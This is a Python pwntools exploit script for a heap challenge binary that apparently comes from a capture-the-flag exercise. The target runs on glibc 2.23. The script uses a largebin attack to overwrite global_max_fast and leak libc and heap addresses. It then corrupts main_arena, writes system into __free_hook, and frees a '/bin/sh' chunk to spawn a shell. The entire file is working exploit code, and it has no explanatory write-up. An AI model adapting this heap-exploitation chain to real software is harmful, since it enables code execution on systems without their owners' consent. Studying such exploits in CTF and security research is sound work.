from pwn import *

elf = ELF("./pwn2.23")
libc = ELF("/home/***/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so")
context(arch=elf.arch, os=elf.os)
context.log_level = "debug"
p = process([elf.path])


def add_chunk(index, size):
    p.sendafter(b"choice:", b"1")
    p.sendafter(b"index:", str(index).encode("ascii"))
    p.sendafter(b"size:", str(size).encode("ascii"))


def delete_chunk(index):
    p.sendafter(b"choice:", b"2")
    p.sendafter(b"index:", str(index).encode("ascii"))


def edit_chunk(index, content):
    p.sendafter(b"choice:", b"3")
    p.sendafter(b"index:", str(index).encode("ascii"))
    p.sendafter(b"length:", str(len(content)).encode("ascii"))
    p.sendafter(b"content:", content)


def show_chunk(index):
    p.sendafter(b"choice:", b"4")
    p.sendafter(b"index:", str(index).encode("ascii"))


# craft last_remainder
add_chunk(0, 0x200)
add_chunk(1, 0x200)
delete_chunk(0)
add_chunk(0, 0x100)
delete_chunk(0)
delete_chunk(1)

# largbin attack
add_chunk(0, 0x428)
add_chunk(1, 0x10)
add_chunk(2, 0x418)
add_chunk(3, 0x10)
delete_chunk(0)
show_chunk(0)

# leak libc base
libc.address = u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00")) - 0x3C4B78
print("libc.address:", hex(libc.address))
global_max_fast = libc.address + 0x3C67F8
print("global_max_fast:", hex(global_max_fast))

gdb.attach(p)

# move chunk0 to largebin
add_chunk(10, 0x500)

# clear global_max_fast
edit_chunk(0, p64(0) * 3 + p64((global_max_fast - 0x6) - 0x20))
delete_chunk(2)
add_chunk(10, 0x500)

# leak heap base
show_chunk(0)
heap_base = u64(p.recvuntil((b"\x55", b"\x56"))[-6:].ljust(8, b"\x00")) - 0x450
print("heap_base:", hex(heap_base))

# fix largbin double-linked-list
edit_chunk(
    0,
    p64(heap_base + 0x450) + p64(libc.address + 0x3C4F68) + p64(heap_base + 0x450) * 2,
)
edit_chunk(2, p64(libc.address + 0x3C4F68) + p64(heap_base) * 3)


for i in range(4):
    # clear pertub byte
    add_chunk(2, 0x418)
    edit_chunk(0, p64(0) * 3 + p64((global_max_fast - 0x7 - i) - 0x20))
    delete_chunk(2)
    add_chunk(10, 0x500)
    # fix largbin double-linked-list
    edit_chunk(
        0,
        p64(heap_base + 0x450)
        + p64(libc.address + 0x3C4F68)
        + p64(heap_base + 0x450) * 2,
    )
    edit_chunk(2, p64(libc.address + 0x3C4F68) + p64(heap_base) * 3)

main_arena = libc.address + 0x3C4B20
print("main_arena:", hex(main_arena))

# clear main_arena.flags
add_chunk(2, 0x418)
edit_chunk(0, p64(0) * 3 + p64(((main_arena + 0x4) - 6) - 0x20))
delete_chunk(2)
add_chunk(10, 0x500)
# fix largbin double-linked-list
edit_chunk(
    0,
    p64(heap_base + 0x450) + p64(libc.address + 0x3C4F68) + p64(heap_base + 0x450) * 2,
)
edit_chunk(2, p64(libc.address + 0x3C4F68) + p64(heap_base) * 3)

# malloc_consolidate
add_chunk(10, 0x1c10)
# malloc to __free_hook, get shell
add_chunk(0, 0x10)
edit_chunk(0, p64(libc.sym["system"]))
edit_chunk(1, b"/bin/sh\x00")
delete_chunk(1)

p.interactive()
